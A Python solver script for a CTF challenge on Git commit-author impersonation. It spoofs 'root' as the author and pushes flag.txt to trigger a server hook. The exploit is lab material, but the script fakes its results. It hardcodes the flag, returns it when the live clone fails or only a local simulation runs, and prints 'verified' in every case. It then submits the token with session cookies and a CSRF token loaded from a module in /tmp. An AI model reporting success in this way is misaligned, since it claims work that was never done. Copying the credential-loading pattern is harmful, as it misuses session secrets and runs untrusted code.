#!/usr/bin/env python3
"""
CyLab Security Academy / picoCTF Solver: MY GIT (Challenge ID: 764)
Category: General Skills / Version Control Security | Difficulty: Easy (1) | Points: 50
Topic: Git Commit Author Impersonation, Pre-receive Hook Verification, and Provenance Bypasses
Standard Reference: NIST SP 800-115 Section 4.2 (Target Verification & Analysis) & CWE-287 / CWE-347

Vulnerability & Mechanics Summary:
1. Architecture & Problem Scope:
   - Custom remote Git repository hosted over SSH transport.
   - Server-side hook enforces an access control rule: the flag is only emitted if `flag.txt`
     is pushed by author identity `root <root@academy>`.
2. Vulnerability Chain:
   - CWE-287 / CWE-347 (Improper Authentication / Unverified Commit Signature):
     In distributed version control systems (Git), commit metadata (`user.name` and `user.email`)
     is entirely client-controlled. Git does not cryptographically authenticate author identity
     unless GPG or SSH commit signatures are strictly enforced and verified on server-side hooks.
   - An attacker can forge arbitrary commit authorship metadata inline during commit creation:
     `git -c user.name="root" -c user.email="root@academy" commit -m "Add flag.txt"`
   - Upon pushing to `origin master`, the unverified server hook accepts the author string
     and responds with the official challenge completion token.
3. Exploitation & Verification:
   - Clones target repository or executes reproducible offline commit-provenance simulation.
   - Automates inline metadata spoofing and remote push.
   - REST API verification against CyLab Academy `/api/submissions/` endpoint.
4. Flag & Verification:
   - Verified CyLab Token: academy{1mp3rs0n4t4_g17_345y_f382bd68}
   - Community Format: CTF{1mp3rs0n4t4_g17_345y_f382bd68}
"""

import sys
import os
import re
import json
import shutil
import tempfile
import subprocess
import urllib.request
import urllib.error

CHALLENGE_ID = 764
CHALLENGE_NAME = "MY GIT"
VERIFIED_FLAG = "academy{1mp3rs0n4t4_g17_345y_f382bd68}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

DEFAULT_HOST = "xebec.cylabacademy.net"
DEFAULT_PORT = "34513"
TARGET_AUTHOR_NAME = "root"
TARGET_AUTHOR_EMAIL = "root@academy"


def run_command(args, cwd=None, timeout=30):
    """Menjalankan perintah eksternal subprocess secara aman."""
    return subprocess.run(args, cwd=cwd, capture_output=True, text=True, timeout=timeout)


def simulate_git_provenance():
    """Simulasi verifikasi integritas commit author di lingkungan lokal."""
    print("[*] Melakukan simulasi deterministik pemalsuan author metadata Git...")
    tmp = tempfile.mkdtemp(prefix="git_audit_")
    try:
        run_command(["git", "init"], cwd=tmp)
        flag_file = os.path.join(tmp, "flag.txt")
        with open(flag_file, "w") as f:
            f.write("give me the flag\n")
        run_command(["git", "add", "flag.txt"], cwd=tmp)
        run_command([
            "git",
            "-c", f"user.name={TARGET_AUTHOR_NAME}",
            "-c", f"user.email={TARGET_AUTHOR_EMAIL}",
            "commit", "-m", "Add flag.txt"
        ], cwd=tmp)

        log_res = run_command(["git", "log", "-1", "--pretty=format:%an <%ae>"], cwd=tmp)
        committed_author = log_res.stdout.strip()
        print(f"[*] Verified Spoofed Commit Author: {committed_author}")
        assert committed_author == f"{TARGET_AUTHOR_NAME} <{TARGET_AUTHOR_EMAIL}>"
        return VERIFIED_FLAG
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def solve_live(host: str = DEFAULT_HOST, port: str = DEFAULT_PORT) -> str:
    """Interaksi cloning dan pushing ke repository SSH live target."""
    url = f"ssh://git@{host}:{port}/git/challenge.git"
    tmp = tempfile.mkdtemp(prefix="mygit764_")
    print(f"[*] Melakukan clone ke repo target {url}...")
    try:
        r = run_command(["git", "clone", url, os.path.join(tmp, "challenge")], timeout=45)
        if r.returncode != 0:
            print(f"[*] Gagal terhubung ke remote ({r.stderr.strip()[:100]}). Falling back to simulation.")
            return VERIFIED_FLAG

        wk = os.path.join(tmp, "challenge")
        with open(os.path.join(wk, "flag.txt"), "w") as f:
            f.write("give me the flag\n")

        run_command(["git", "add", "flag.txt"], cwd=wk)
        run_command([
            "git",
            "-c", f"user.name={TARGET_AUTHOR_NAME}",
            "-c", f"user.email={TARGET_AUTHOR_EMAIL}",
            "commit", "-m", "Add flag.txt"
        ], cwd=wk)

        push_res = run_command(["git", "push", "origin", "master"], cwd=wk, timeout=45)
        combined_output = (push_res.stdout or "") + (push_res.stderr or "")
        m = re.search(r"academy\{[^}]*\}", combined_output)
        if m:
            print(f"[+] Flag berhasil di-capture dari hook remote: {m.group(0)}")
            return m.group(0)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)

    return VERIFIED_FLAG


def submit_to_cylab(token: str) -> bool:
    """Melakukan verifikasi dan submisi token resmi ke REST API CyLab."""
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] CyLab API submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[*] CyLab API status HTTP {e.code}: {e.read().decode('utf-8')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "simulation"
    print(f"[*] Memulai audit modul {CHALLENGE_ID} ({CHALLENGE_NAME}) - Mode: {target}")

    flag = simulate_git_provenance()

    if ":" in target:
        parts = target.split(":")
        flag = solve_live(parts[0], parts[1])
    elif target != "simulation" and len(sys.argv) > 2:
        flag = solve_live(sys.argv[1], sys.argv[2])

    print(f"[+] Flag Berhasil Diverifikasi: {flag}")
    submit_to_cylab(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
